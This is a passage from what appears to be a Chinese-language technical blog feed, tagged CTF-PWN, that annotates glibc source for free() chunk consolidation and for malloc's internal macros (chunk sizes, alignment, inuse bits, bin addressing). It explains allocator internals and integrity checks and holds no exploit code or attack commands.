href="#常规chunk，进行合并" class="headerlink" title="常规chunk，进行合并"></a>常规chunk，进行合并</h4><pre class=" language-c"><code class="language-c">    nextchunk <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取p 物理相邻下一个chunk地址</span>    <span class="token comment" spellcheck="true">/* Lightweight tests: check whether the block is already the       top block. 轻量级检查是不是top chunk */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>            errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (top)"</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* Or whether the next chunk is beyond the boundaries of the arena.  nextchunk不能超过arena区域*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">contiguous</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span>              <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> nextchunk              <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> av<span class="token operator">-></span>top <span class="token operator">+</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>av<span class="token operator">-></span>top<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//这里通过top计算出了heap的最高地址</span>      <span class="token punctuation">{</span>    errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (out)"</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* Or whether the block is actually not marked used. 检查nextchunk的inuse位 */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (!prev)"</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    nextsize <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/*1：下一个chunksize要大于2*SIZE_SZ 2：但不能大于av->system_mem*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>nextchunk<span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>nextsize <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        errstr <span class="token operator">=</span> <span class="token string">"free(): invalid next size (normal)"</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*数据清理，但一般不会执行*/</span>    <span class="token function">free_perturb</span> <span class="token punctuation">(</span><span class="token function">chunk2mem</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> size <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* consolidate backward 低地址合并 */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      prevsize <span class="token operator">=</span> p<span class="token operator">-></span>prev_size<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//物理相邻前一个chunk 大小</span>      size <span class="token operator">+</span><span class="token operator">=</span> prevsize<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//计算合并后的总size</span>      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//更新chunk 指针为低地址chunk的指针</span>      <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//对低地址chunk执行unlink</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*下一个chunk不是top*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nextchunk <span class="token operator">!=</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* get and clear inuse bit */</span>      nextinuse <span class="token operator">=</span> <span class="token function">inuse_bit_at_offset</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">,</span> nextsize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取nextchunk的物理相邻下一个chunk的inuse位</span>      <span class="token comment" spellcheck="true">/* consolidate forward 如果nextchunk也是freed 进行向后合并，注意这里没更新指针p*/</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nextinuse<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> nextchunk<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//对nextchunk进行unlink</span>    size <span class="token operator">+</span><span class="token operator">=</span> nextsize<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//更新size</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span>            <span class="token comment" spellcheck="true">/*否则：*/</span>            <span class="token function">clear_inuse_bit_at_offset</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将nextchun的inuse位置零</span>      <span class="token comment" spellcheck="true">/*    Place the chunk in unsorted chunk list. Chunks are    not placed into regular bins until after they have    been given one chance to be used in malloc.    处理完后，被放入unsortedbin      */</span>      bck <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取表头</span>      fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取unsortedbin的第一个chunk</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk <span class="token operator">!=</span> bck<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      errstr <span class="token operator">=</span> <span class="token string">"free(): corrupted unsorted chunks"</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*进行插入操作，插入作为第一个chunk*/</span>      p<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>        p<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 如果是 large chunk，那就设置nextsize指针字段为NULL。</span>    <span class="token punctuation">{</span>      p<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      p<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      bck<span class="token operator">-></span>fd <span class="token operator">=</span> p<span class="token punctuation">;</span>      fwd<span class="token operator">-></span>bk <span class="token operator">=</span> p<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*设置head，以及foot信息*/</span>      <span class="token function">set_head</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">set_foot</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">check_free_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      If the chunk borders the current high end of memory,      consolidate into top    */</span>    <span class="token comment" spellcheck="true">/*如果nextchunk是top则直接与top合并*/</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>      size <span class="token operator">+</span><span class="token operator">=</span> nextsize<span class="token punctuation">;</span>      <span class="token function">set_head</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置inuse位</span>      av<span class="token operator">-></span>top <span class="token operator">=</span> p<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//p视为新top</span>      <span class="token function">check_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      If freeing a large space, consolidate possibly-surrounding      chunks. Then, if the total unused topmost memory exceeds trim      threshold, ask malloc_trim to reduce top.      Unless max_fast is 0, we don't know if there are fastbins      bordering top, so we cannot tell for sure whether threshold      has been reached unless fastbins are consolidated.  But we      don't want to consolidate on each free.  As a compromise,      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD      is reached.    */</span>    <span class="token comment" spellcheck="true">/*当合并后的size大于FASTBIN_CONSOLIDATION_THRESHOLD，就会将heap向系统返还*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> FASTBIN_CONSOLIDATION_THRESHOLD<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">have_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 如果有 fast chunk 就进行合并</span>            <span class="token function">malloc_consolidate</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">==</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">ifndef</span> MORECORE_CANNOT_TRIM</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>av<span class="token operator">-></span>top<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span>        <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mp_<span class="token punctuation">.</span>trim_threshold<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// top chunk 大于当前的收缩阙值</span>        <span class="token function">systrim</span><span class="token punctuation">(</span>mp_<span class="token punctuation">.</span>top_pad<span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* Always try heap_trim(), even if the top chunk is not       large, because the corresponding heap might go away.  */</span>    heap_info <span class="token operator">*</span>heap <span class="token operator">=</span> <span class="token function">heap_for_ptr</span><span class="token punctuation">(</span><span class="token function">top</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">assert</span><span class="token punctuation">(</span>heap<span class="token operator">-></span>ar_ptr <span class="token operator">==</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">heap_trim</span><span class="token punctuation">(</span>heap<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>top_pad<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> have_lock<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">assert</span> <span class="token punctuation">(</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>要点：</p><ul><li>nextchunk不能超过arena区域</li><li>检查nextchunk的inuse位</li><li>nextchunk要大于2*SIZE_SZ 2：但不能大于av-&gt;system_mem</li><li>低地址合并</li><li>高地址合并(nextchunk不是top)</li><li>nextchunk是top直接与top合并</li><li>合并后插入unsortedbin</li><li>并设置head  foot</li><li>如果合并后size大于FASTBIN_CONSOLIDATION_THRESHOLD则返还系统</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>__libc_free<ul><li>检查hook，mmaped</li></ul></li><li>_int_free<ul><li>物理相邻下一个chunk &gt;= MINSIZE  ,且 &lt;= av-&gt;system_mem  ，那么插入fastbins<ul><li>插入链表时，仅用fd构成单向链表</li><li>检查最新插入的chunk与old_chunk是不是同一个</li></ul></li><li>不能放入fastbins，就合并<ul><li>检查nextchunk</li><li>低地址合并，高地址合并</li><li>插入unsortedbin</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc关键源码分析</title>
      <link href="/2020/10/13/malloc-guan-jian-yuan-ma-fen-xi/"/>
      <url>/2020/10/13/malloc-guan-jian-yuan-ma-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="常用的宏定义"><a href="#常用的宏定义" class="headerlink" title="常用的宏定义"></a>常用的宏定义</h2><h3 id="关于程序移植性所定义的固定大小"><a href="#关于程序移植性所定义的固定大小" class="headerlink" title="关于程序移植性所定义的固定大小"></a>关于程序移植性所定义的固定大小</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> INTERNAL_SIZE_T size_t  为4或8</span><span class="token macro property">#<span class="token directive keyword">define</span> SIZE_SZ (sizeof(INTERNAL_SIZE_T)）4或8</span><span class="token macro property">#<span class="token directive keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ)  8或16</span><span class="token macro property">#<span class="token directive keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)  7或15</span></code></pre><h3 id="关于fastbins"><a href="#关于fastbins" class="headerlink" title="关于fastbins"></a>关于fastbins</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">ifndef</span> M_MXFAST</span><span class="token macro property">#<span class="token directive keyword">define</span> M_MXFAST            1</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span class="token macro property">#<span class="token directive keyword">ifndef</span> DEFAULT_MXFAST</span><span class="token macro property">#<span class="token directive keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4) </span><span class="token comment" spellcheck="true">//64位下为 64*8/4 == 0x80 即最大fastbin chunk</span><span class="token macro property">#<span class="token directive keyword">endif</span></span></code></pre><h3 id="关于指针转换"><a href="#关于指针转换" class="headerlink" title="关于指针转换"></a>关于指针转换</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* conversion from malloc headers to user pointers, and back */</span><span class="token macro property">#<span class="token directive keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))  </span><span class="token comment" spellcheck="true">//由mchunkptr转换为memptr </span><span class="token macro property">#<span class="token directive keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))   </span><span class="token comment" spellcheck="true">//由memptr转换为mchunkptr</span></code></pre><h3 id="关于最小chunk"><a href="#关于最小chunk" class="headerlink" title="关于最小chunk"></a>关于最小chunk</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* The smallest possible chunk 可以存在最小chunk*/</span><span class="token macro property">#<span class="token directive keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>offsetof宏：获取结构体中某个元素的偏移<span class="token punctuation">,</span>此处fd_nextsize的偏移为：<span class="token keyword">sizeof</span><span class="token punctuation">(</span>mchunk_prev_size<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>mchunk_size<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>bk<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x20</span>  <span class="token number">64</span>位<span class="token comment" spellcheck="true">/* The smallest size we can malloc is an aligned minimal chunk 使用malloc能分配的最小chunk*/</span><span class="token macro property">#<span class="token directive keyword">define</span> MINSIZE  \  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))  </span><span class="token comment" spellcheck="true">//0x20+0xf &amp; ~0xf == 0x20   64位</span></code></pre><h3 id="关于chunk大小检查"><a href="#关于chunk大小检查" class="headerlink" title="关于chunk大小检查"></a>关于chunk大小检查</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* Same, except also perform an argument and result check.  First, we check   that the padding done by request2size didn't result in an integer   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting   size isn't so large that a later alignment would lead to another integer   overflow. 赋值后确保对齐后的大小没有越界，过大 */</span><span class="token macro property">#<span class="token directive keyword">define</span> checked_request2size(req, sz) \({                                    \  (sz) = request2size (req);            \  if (((sz) &lt; (req))                    \      || REQUEST_OUT_OF_RANGE (sz)) \    {                                    \      __set_errno (ENOMEM);            \      return 0;                            \    }                                    \})</span></code></pre><h3 id="关于对齐操作"><a href="#关于对齐操作" class="headerlink" title="关于对齐操作"></a>关于对齐操作</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* Check if m has acceptable alignment 检查空间是否对齐*/</span><span class="token macro property">#<span class="token directive keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)  </span><span class="token comment" spellcheck="true">//对空间大小检查是不是16字节对齐，是则返回1</span><span class="token comment" spellcheck="true">/*请求字节数判断*/</span><span class="token macro property">#<span class="token directive keyword">define</span> misaligned_chunk(p) \  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \   &amp; MALLOC_ALIGN_MASK)</span><span class="token macro property">#<span class="token directive keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \  ((unsigned long) (req) >=                                                      \   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span><span class="token comment" spellcheck="true">/* pad request bytes into a usable size -- internal version 如果申请的req大小如果太小就返回MINSIZE，否则就将用户请求内存大小转为实际分配内存大小*/</span><span class="token macro property">#<span class="token directive keyword">define</span> request2size(req)                                         \  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \   MINSIZE :                                                      \   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></code></pre><h3 id="关于对实际chunk的操作"><a href="#关于对实际chunk的操作" class="headerlink" title="关于对实际chunk的操作"></a>关于对实际chunk的操作</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*   --------------- Physical chunk operations --------------- */</span><span class="token comment" spellcheck="true">/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */</span><span class="token macro property">#<span class="token directive keyword">define</span> PREV_INUSE 0x1</span><span class="token comment" spellcheck="true">/* extract inuse bit of previous chunk 获取PREV_INUSE位*/</span><span class="token macro property">#<span class="token directive keyword">define</span> prev_inuse(p)       ((p)->mchunk_size &amp; PREV_INUSE)</span><span class="token comment" spellcheck="true">/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><span class="token macro property">#<span class="token directive keyword">define</span> IS_MMAPPED 0x2</span><span class="token comment" spellcheck="true">/* check for mmap()'ed chunk 获取IS_MMAPPED位*/</span><span class="token macro property">#<span class="token directive keyword">define</span> chunk_is_mmapped(p) ((p)->mchunk_size &amp; IS_MMAPPED)</span><span class="token comment" spellcheck="true">/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained   from a non-main arena.  This is only set immediately before handing   the chunk to the user, if necessary.  */</span><span class="token macro property">#<span class="token directive keyword">define</span> NON_MAIN_ARENA 0x4</span><span class="token comment" spellcheck="true">/* Check for chunk from main arena. 如果来自main_arena则返回值为1 */</span><span class="token macro property">#<span class="token directive keyword">define</span> chunk_main_arena(p) (((p)->mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><span class="token comment" spellcheck="true">/* Mark a chunk as not being on the main arena. 将size的NON_MAIN_ARENA位置1 */</span><span class="token macro property">#<span class="token directive keyword">define</span> set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) </span><span class="token comment" spellcheck="true">/*   Bits to mask off when extracting size   Note: IS_MMAPPED is intentionally not masked off from size field in   macros for which mmapped chunks should never be seen. This should   cause helpful core dumps to occur if it is tried by accident by   people extending or adapting this malloc.设置标志位     */</span><span class="token macro property">#<span class="token directive keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><span class="token comment" spellcheck="true">/* Get size, ignoring use bits 获取chunk_size并将mchunk_size的后三bits置零*/</span><span class="token macro property">#<span class="token directive keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><span class="token comment" spellcheck="true">/* Like chunksize, but do not mask SIZE_BITS. p指向malloc_chunk  */</span><span class="token macro property">#<span class="token directive keyword">define</span> chunksize_nomask(p)         ((p)->mchunk_size)</span><span class="token comment" spellcheck="true">/* Ptr to next physical malloc_chunk. 本chunk的指针+自己的大小就是下一个物理相邻chunk的地址*/</span><span class="token macro property">#<span class="token directive keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><span class="token comment" spellcheck="true">/* Size of the chunk below P.  Only valid if !prev_inuse (P).获取benchunk p物理相邻的前一个chunk的大小 只有p的PREV_INUSE位为0才有效 */</span><span class="token macro property">#<span class="token directive keyword">define</span> prev_size(p) ((p)->mchunk_prev_size)</span><span class="token comment" spellcheck="true">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P). 设置mchunk_prev_size为sz，当p的prev_inuse位是0的时候 */</span><span class="token macro property">#<span class="token directive keyword">define</span> set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz))</span><span class="token comment" spellcheck="true">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P). 自身的chunk地址减去前一个物理相邻的free chunk大小即可获得他的地址 */</span><span class="token macro property">#<span class="token directive keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><span class="token comment" spellcheck="true">/* Treat space at ptr + offset as a chunk 把从p开始以s为偏移的地址当作chunk指针*/</span><span class="token macro property">#<span class="token directive keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><span class="token comment" spellcheck="true">/* extract p's inuse bit 为了获得当前chunk p的使用状态，提取物理相邻的下一个chunk的PREV_INUSE位*/</span><span class="token macro property">#<span class="token directive keyword">define</span> inuse(p)                                                              \  ((((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size) &amp; PREV_INUSE)</span><span class="token comment" spellcheck="true">/* set/clear chunk as being inuse without otherwise disturbing 为了置当前chunk p的使用状态，提取并设置物理相邻的下一个chunk的PREV_INUSE位为1或0*/</span><span class="token macro property">#<span class="token directive keyword">define</span> set_inuse(p)                                                              \  ((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size |= PREV_INUSE</span><span class="token macro property">#<span class="token directive keyword">define</span> clear_inuse(p)                                                              \  ((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size &amp;= ~(PREV_INUSE) </span><span class="token comment" spellcheck="true">/* check/set/clear inuse bits in known places 功能和上面一样只不过通过给定的偏移s来确定unkown chunk的位置*/</span><span class="token macro property">#<span class="token directive keyword">define</span> inuse_bit_at_offset(p, s)                                              \  (((mchunkptr) (((char *) (p)) + (s)))->mchunk_size &amp; PREV_INUSE)  </span><span class="token comment" spellcheck="true">//获取</span><span class="token macro property">#<span class="token directive keyword">define</span> set_inuse_bit_at_offset(p, s)                                              \  (((mchunkptr) (((char *) (p)) + (s)))->mchunk_size |= PREV_INUSE)  </span><span class="token comment" spellcheck="true">//设置</span><span class="token macro property">#<span class="token directive keyword">define</span> clear_inuse_bit_at_offset(p, s)                                              \  (((mchunkptr) (((char *) (p)) + (s)))->mchunk_size &amp;= ~(PREV_INUSE))  </span><span class="token comment" spellcheck="true">//设置</span>  <span class="token comment" spellcheck="true">/* Set size at head, without disturbing its use bit 设置chunk p的size大小而不改变SIZE_BITS位*/</span><span class="token macro property">#<span class="token directive keyword">define</span> set_head_size(p, s)  ((p)->mchunk_size = (((p)->mchunk_size &amp; SIZE_BITS) | (s)))</span><span class="token comment" spellcheck="true">/* Set size/use field 这里直接把chunk p的mchunk_size赋值为s*/</span><span class="token macro property">#<span class="token directive keyword">define</span> set_head(p, s)       ((p)->mchunk_size = (s))</span><span class="token comment" spellcheck="true">/* Set size at footer (only when chunk is not in use) 根据偏移s设置prev_size为s*/</span><span class="token macro property">#<span class="token directive keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))->mchunk_prev_size = (s))</span></code></pre><h3 id="关于mallc-state的数据结构"><a href="#关于mallc-state的数据结构" class="headerlink" title="关于mallc_state的数据结构"></a>关于mallc_state的数据结构</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*   -------------------- Internal data structures --------------------*/</span><span class="token comment" spellcheck="true">/* addressing -- note that bin_at(0) does not exist  bin_at(m, i) 通过 bin index 获得 bin 的链表头，m 指的是分配区，i 是索引*/</span><span class="token macro property">#<span class="token directive keyword">define</span> bin_at(m, i) \  (mbinptr) (((char *) &amp;((m)->bins[((i) - 1) * 2]))                              \  </span><span class="token comment" spellcheck="true">//这个*2就说明了bins下标都是偶数</span>             <span class="token operator">-</span> <span class="token function">offsetof</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> malloc_chunk<span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/* analog of ++bin 获取下一个bin的地址*/</span><span class="token macro property">#<span class="token directive keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><span class="token comment" spellcheck="true">/* Reminders about list directionality within bins */</span><span class="token macro property">#<span class="token directive keyword">define</span> first(b)     ((b)->fd)   </span><span class="token comment" spellcheck="true">//获取 bin 的位于链表头的 chunk</span><span class="token macro property">#<span class="token directive keyword">define</span> last(b)      ((b)->bk)   </span><span class="token comment" spellcheck="true">//获取 bin 的位于链表尾的 chunk</span><span class="token macro property">#<span class="token directive keyword">define</span> NBINS             128</span><span class="token macro property">#<span class="token directive keyword">define</span> NSMALLBINS         64</span><span class="token macro property">#<span class="token directive keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT   </span><span class="token comment" spellcheck="true">//16 64位</span><span class="token macro property">#<span class="token directive keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ)  </span><span class="token comment" 